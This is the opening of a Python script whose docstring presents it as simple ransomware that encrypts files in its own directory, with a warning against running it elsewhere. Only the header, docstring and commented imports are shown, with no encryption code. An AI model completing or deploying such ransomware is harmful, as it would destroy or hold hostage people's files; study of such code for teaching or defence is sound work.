#!/usr/bin/env python3
# Shebang
'''
WARNING!!! Do not run this command outside of this directory,
and do not use this code anywhere else.
This script is the simple ransomeware
that will encrypt files within the same directory
'''

# Importing important packages

import logging # For logging debug messages.
import os # For interacting with the operating system (e.g., file paths).
import sys # For accessing system-specific parameters and functions.
import base64 # For encoding and decoding data using Base64.

